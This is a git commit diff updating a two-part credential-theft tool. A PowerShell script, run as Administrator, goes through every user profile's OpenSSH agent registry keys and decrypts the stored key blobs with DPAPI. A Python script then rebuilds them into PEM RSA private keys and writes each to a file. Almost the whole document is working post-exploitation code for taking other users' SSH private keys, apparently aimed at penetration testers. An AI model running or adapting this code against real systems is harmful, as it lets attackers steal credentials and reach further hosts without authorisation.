4ddf94e8cc565dc31156b42b2c18acbaac24865b
porpeeranut <porpeeranut@gmail.com>
2018-05-22 19:09:11 +0700

    update .ps1 to pull ssh keys from all users, python 2-3 compatible

--- extractPrivateKeys.py
+++ extractPrivateKeys.py
@@ -4,107 +4,89 @@
 # Original implementation and all credit due to this script by soleblaze: 
 # https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py
 
-
-import sys
-import base64
-import json
+import sys, os, base64, json, re
 try:
-    from pyasn1.type import univ
-    from pyasn1.codec.der import encoder
+	from pyasn1.type import univ
+	from pyasn1.codec.der import encoder
 except ImportError:
-    print("You must install pyasn1")
-    sys.exit(0)
-
+	print("You must install pyasn1")
+	sys.exit(0)
 
 def extractRSAKey(data):
-    keybytes = base64.b64decode(data)
-    offset = keybytes.find(b"ssh-rsa")
-    if not offset:
-        print("[!] No valid RSA key found")
-        return None
-    keybytes = keybytes[offset:]
+	keybytes = base64.b64decode(data)
+	offset = keybytes.find(b"ssh-rsa")
+	if not offset:
+		print("[!] No valid RSA key found")
+		return None
+	keybytes = keybytes[offset:]
 
-    # This code is re-implemented code originally written by soleblaze in sshkey-grab
-    start = 10
-    size = getInt(keybytes[start:(start+2)])
-    # size = unpack_bigint(keybytes[start:(start+2)])
-    start += 2
-    n = getInt(keybytes[start:(start+size)])
-    start = start + size + 2
-    size = getInt(keybytes[start:(start+2)])
-    start += 2
-    e = getInt(keybytes[start:(start+size)])
-    start = start + size + 2
-    size = getInt(keybytes[start:(start+2)])
-    start += 2
-    d = getInt(keybytes[start:(start+size)])
-    start = start + size + 2
-    size = getInt(keybytes[start:(start+2)])
-    start += 2
-    c = getInt(keybytes[start:(start+size)])
-    start = start + size + 2
-    size = getInt(keybytes[start:(start+2)])
-    start += 2
-    p = getInt(keybytes[start:(start+size)])
-    start = start + size + 2
-    size = getInt(keybytes[start:(start+2)])
-    start += 2
-    q = getInt(keybytes[start:(start+size)])
+	def unpack_val(keybytes, start):
+		size = int.from_bytes(keybytes[start:(start+2)], byteorder='big') if sys.version_info[0] == 3 else int(keybytes[start:(start+2)].encode('hex'), 16)
+		start += 2
+		val = int.from_bytes(keybytes[start:(start+size)], byteorder='big') if sys.version_info[0] == 3 else int(keybytes[start:(start+size)].encode('hex'), 16)
+		start = start + size + 2
+		return val, start
 
-    e1 = d % (p - 1)
-    e2 = d % (q - 1)
+	# This code is re-implemented code originally written by soleblaze in sshkey-grab
+	start = 10
+	n, start = unpack_val(keybytes, start)
+	e, start = unpack_val(keybytes, start)
+	d, start = unpack_val(keybytes, start)
+	c, start = unpack_val(keybytes, start)
+	p, start = unpack_val(keybytes, start)
+	q, start = unpack_val(keybytes, start)
 
-    keybytes = keybytes[start+size:]
+	e1 = d % (p - 1)
+	e2 = d % (q - 1)
+	seq = (
+		univ.Integer(0),
+		univ.Integer(n),
+		univ.Integer(e),
+		univ.Integer(d),
+		univ.Integer(p),
+		univ.Integer(q),
+		univ.Integer(e1),
+		univ.Integer(e2),
+		univ.Integer(c),
+	)
+	structUniv = univ.Sequence()
 
-    seq = (
-        univ.Integer(0),
-        univ.Integer(n),
-        univ.Integer(e),
-        univ.Integer(d),
-        univ.Integer(p),
-        univ.Integer(q),
-        univ.Integer(e1),
-        univ.Integer(e2),
-        univ.Integer(c),
-    )
+	for i in range(len(seq)):
+		structUniv.setComponentByPosition(i, seq[i])
+	
+	raw = encoder.encode(structUniv)
+	data = base64.b64encode(raw).decode('utf-8')
 
-    struct = univ.Sequence()
-
-    for i in range(len(seq)):
-        struct.setComponentByPosition(i, seq[i])
-    
-    raw = encoder.encode(struct)
-    data = base64.b64encode(raw).decode('utf-8')
-
-    width = 64
-    chopped = [data[i:i + width] for i in range(0, len(data), width)]
-    top = "-----BEGIN RSA PRIVATE KEY-----\n"
-    content = "\n".join(chopped)
-    bottom = "\n-----END RSA PRIVATE KEY-----"
-    return top+content+bottom
-
-def getInt(buf):
-    return int.from_bytes(buf, byteorder='big')
-
+	width = 64
+	chopped = [data[i:i + width] for i in range(0, len(data), width)]
+	top = "-----BEGIN RSA PRIVATE KEY-----\n"
+	content = "\n".join(chopped)
+	bottom = "\n-----END RSA PRIVATE KEY-----"
+	return top+content+bottom
 
 def run(filename):
-    with open(filename, 'r') as fp:
-        keysdata = json.loads(fp.read())
-    
-    for jkey in keysdata:
-        for keycomment, data in jkey.items():
-            privatekey = extractRSAKey(data)
-            print("[+] Key Comment: {}".format(keycomment))
-            print(privatekey)
-            print()
-    
-    sys.exit(0)
-
-
+	with open(filename, 'r') as fp:
+		keysdata = json.loads(fp.read())
+	
+	for jkey in keysdata:
+		privatekey = extractRSAKey(jkey['data'])
+		keycomment = re.findall(r'[\\/]?([^\\/]*)$', jkey['comment'])[0]
+		print("\n[+] SID: {}".format(jkey['sid']))
+		print("[+] Key Comment: {}".format(keycomment))
+		print(privatekey)
+		outfile = jkey['sid']+'_'+keycomment
+		if os.path.exists(outfile):
+			text = "\nFile '"+outfile+"' already exist, wanna replace? (y/n):"
+			inp = input(text).lower() if sys.version_info[0] == 3 else raw_input(text).lower()
+			if inp != 'y':
+				continue
+		with open(outfile, 'w') as f:
+			f.write(privatekey)
+	sys.exit(0)
 
 if __name__ == '__main__':
-    if len(sys.argv) != 2:
-        print("Usage: {} extracted_keyblobs.json".format(sys.argv[0]))
-        sys.exit(0)
-    filename = sys.argv[1]
-    run(filename)
+	if len(sys.argv) != 2:
+		print("Usage: {} extracted_keyblobs.json".format(sys.argv[0]))
+		sys.exit(0)
+	filename = sys.argv[1]
+	run(filename)
--- extract_ssh_keys.ps1
+++ extract_ssh_keys.ps1
@@ -1,30 +1,35 @@
-$path = "HKCU:\Software\OpenSSH\Agent\Keys\"
-
-$regkeys = Get-ChildItem $path | Get-ItemProperty
-
-if ($regkeys.Length -eq 0) {
-    Write-Host "No keys in registry"
-    exit
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-Not($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
+	Write-Host "Administrator is required"
+	exit
 }
+New-PSDrive HKU Registry HKEY_USERS >$null
+$sids = ls 'hklm:software/microsoft/windows nt/currentversion/profilelist' | ? { $_.getvalue('profileimagepath') -match 'Users' } | % pschildname
 
 $keys = @()
+foreach($sid in $sids) {
+	$path = "HKU:\${sid}\Software\OpenSSH\Agent\Keys\"
+	$regkeys = Get-ChildItem $path | Get-ItemProperty
 
-Add-Type -AssemblyName System.Security;
-
-$regkeys | ForEach-Object {
-    $key = @{}
-    $comment = [System.Text.Encoding]::ASCII.GetString($_.comment)
-    Write-Host "Pulling key: " $comment
-    $encdata = $_.'(default)'
-    $decdata = [Security.Cryptography.ProtectedData]::Unprotect($encdata, $null, 'CurrentUser')
-    $b64key = [System.Convert]::ToBase64String($decdata)
-    $key[$comment] = $b64key
-    $keys += $key
+	if ($regkeys.Length -eq 0) {
+		Write-Host "No keys in registry"
+	}
+	Add-Type -AssemblyName System.Security;
+	$regkeys | ForEach-Object {
+		$key = @{}
+		$comment = [System.Text.Encoding]::ASCII.GetString($_.comment)
+		Write-Host "Pulling key: " $sid $comment
+		$encdata = $_.'(default)'
+		$decdata = [Security.Cryptography.ProtectedData]::Unprotect($encdata, $null, 'CurrentUser')
+		$b64key = [System.Convert]::ToBase64String($decdata)
+		$key['comment'] = $comment
+		$key['data'] = $b64key
+		$key['sid'] = $sid
+		$keys += $key
+	}
 }
-
-ConvertTo-Json -InputObject $keys | Out-File -FilePath './extracted_keyblobs.json' -Encoding ascii
-Write-Host "extracted_keyblobs.json written. Use Python script to reconstruct private keys: python extractPrivateKeys.py extracted_keyblobs.json"
-
-
-
-
+if ($keys.Length -ne 0) {
+	ConvertTo-Json -InputObject $keys | Out-File -FilePath './extracted_keyblobs.json' -Encoding ascii
+	Write-Host "extracted_keyblobs.json written. Use Python script to reconstruct private keys:"
+	Write-Host "python extractPrivateKeys.py extracted_keyblobs.json"
+}
